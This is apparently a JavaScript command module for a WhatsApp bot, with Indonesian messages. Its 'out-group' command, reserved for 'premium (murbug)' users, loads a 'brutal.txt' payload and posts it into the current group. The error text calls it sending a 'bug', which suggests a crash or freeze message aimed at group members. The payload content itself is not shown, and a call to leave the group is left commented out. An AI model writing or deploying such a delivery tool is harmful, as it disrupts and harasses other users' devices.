const fs = require('fs');

module.exports = {
    command: 'out-group',
    execute: async (sock, m, { args, reply, isPremium }) => {
        if (!isPremium) return reply("Fitur ini khusus untuk member premium (murbug).");
        
        const target = m.chat; // Inplace Group
        if (!target.endsWith('@g.us')) return reply("Fitur ini hanya bisa digunakan di dalam grup.");

        const BRUTAL_FILE = './brutal.txt';

        try {
            if (!fs.existsSync(BRUTAL_FILE)) return reply("File payload brutal.txt tidak ditemukan.");
            
            const payload = fs.readFileSync(BRUTAL_FILE, 'utf-8');
            const finalChat = '⿻ 𝐌𝐚𝐫𝐢𝐧 𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫\n' + payload;

            await reply(`Sending out-group payload...`);

            await sock.sendMessage(target, { text: finalChat });
            
            // Optional: Leave group
            // await sock.groupLeave(target);

            reply(`Payload delivered to group.`);
        } catch (err) {
            reply("Gagal mengirim bug: " + err.message);
        }
    }
};
